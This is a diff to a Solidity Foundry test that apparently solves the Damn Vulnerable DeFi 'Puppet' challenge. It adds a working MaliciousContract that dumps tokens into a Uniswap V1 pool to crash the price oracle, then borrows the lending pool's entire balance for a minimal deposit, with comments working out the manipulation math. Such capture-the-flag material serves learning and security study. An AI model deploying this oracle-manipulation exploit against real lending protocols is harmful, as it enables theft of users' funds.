@@ -91,8 +91,25 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
+    // 10 ETH / 10 DVT (POOL)  25 ETH / 1000 DVT (USER)
+    // borrow rate : 1 ETH -> 0.5 DVT
+    // 1 ETH / 100 DVT (POOL)  34 ETH / 910 DVT (USER)
+    // borrow rate 1 ETH -> 50 DVT
+    // 0.1 ETH / 1000 DVT (POOL) 34.9 ETH / 10 DVT (USER)
+    // borrow rate : 1 ETH -> 5000 DVT
+    // Maxium borrow : 25.9 * 5000 = 129,500
     function test_puppet() public checkSolvedByPlayer {
-        
+        MaliciousContract maliciousContract = new MaliciousContract(
+            address(token),
+            address(lendingPool),
+            address(uniswapV1Exchange),
+            recovery
+        );
+
+        token.transfer(address(maliciousContract), token.balanceOf(player));
+        maliciousContract.attack{value: address(player).balance}();
+
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +132,32 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract MaliciousContract {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address recovery;
+
+    uint256 constant BOUGHT_AMOUNT_ETH_MANIPULATE_PRICE = 9.9 ether;
+
+    constructor(address _token, address _lendingPool, address _uniswapV1Exchange, address _recovery) {
+        token = DamnValuableToken(_token);
+        lendingPool = PuppetPool(_lendingPool);
+        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
+        recovery = _recovery;
+    }
+
+
+    function attack() payable public {
+        token.approve(address(uniswapV1Exchange), type(uint256).max);
+        uniswapV1Exchange.tokenToEthSwapOutput(BOUGHT_AMOUNT_ETH_MANIPULATE_PRICE, type(uint256).max, block.timestamp);
+        uint256 amountToBorrow = token.balanceOf(address(lendingPool));
+        uint256 depositRequired = lendingPool.calculateDepositRequired(amountToBorrow);
+        lendingPool.borrow{value: depositRequired}(amountToBorrow, address(this));
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+    
+    receive() payable external {}
 }
